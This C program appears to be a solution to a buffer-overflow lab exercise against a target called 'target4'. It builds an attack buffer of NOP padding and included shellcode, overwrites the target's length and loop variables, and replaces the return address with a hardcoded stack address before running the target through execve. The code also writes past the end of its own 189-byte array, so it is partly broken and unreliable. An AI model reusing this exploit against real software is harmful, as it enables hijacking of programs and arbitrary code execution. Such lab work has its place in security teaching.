#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
	char *args[3];
	char *env[11];

  // we use GDB to disaseemble the target.o, and we find the following
 	// return address at 0x30521e68
  // attack buffer address starts at 0x30521db0
	// requires size of attackbuf to be 184 bytes, plus 4 bytes for our address,
  // 1 byte for null, total 189 bytes
	int size_buf = 189;
	int i = 0;
	char attackbuf[size_buf];


  // fill the buffer with NOPs first, this will provide padding in the
  // extra spaces in attack buffer
	for(i = 0; i < size_buf; i++){
		attackbuf[i] = '\x90'; //noop
	}

	for(i = 0; i <45; i++){
		attackbuf[i] = shellcode[i];
	}


	// the len variable is located at 1e58 in hex =  168 in decimal
  // 168 offset from begin of attack buffer
	// we write 189 to it, or 0xBD in hex to it to change the length of attack buffer
	// int* a  = (int*)&attackbuf[168];
	// *a = 0x000000BD;


	attackbuf[168] = '\xbd';
	attackbuf[169] = '\x00';
	attackbuf[170] = '\x00';//align
	attackbuf[171] = '\x00';


	// i is located at 1e5c, offset 172 from buf
	// int* b = (int*)&attackbuf[172];
	// *b = (int *)0x000000A9;

	attackbuf[172] = '\xa9';
	attackbuf[173] = '\x00';
	attackbuf[174] = '\x00';
	attackbuf[175] = '\x00';


	for(i = 176; i <size_buf; i++){
		attackbuf[i] = '\x90';
	}

  // fills in our attack buffer's address instead of the original return address
	attackbuf[184] = '\xb0';
	attackbuf[185] = '\x1d';
	attackbuf[186] = '\x52';
	attackbuf[187] = '\x30';
	attackbuf[188] = '\x00';
	attackbuf[189] = '\x00';
	attackbuf[190] = '\x00';
	attackbuf[191] = '\x00';



	args[0] = TARGET;
	args[1] = attackbuf;
	args[2] = NULL;

  // since env varaible comes right after args in the stack, we make env
  // to point to our attack buffer
	env[0] = &attackbuf[169];
	env[1] = &attackbuf[170];
	env[2] = &attackbuf[171];
	env[3] = &attackbuf[173];
	env[4] = &attackbuf[174];
	env[5] = &attackbuf[175];
	env[6] = &attackbuf[176];
	env[7] = &attackbuf[188];
	env[8] = &attackbuf[189];
	env[9] = &attackbuf[190];
	env[10] = &attackbuf[191];

	if (0 > execve(TARGET, args, env))
  		fprintf(stderr, "execve failed.\n");

	return 0;
}
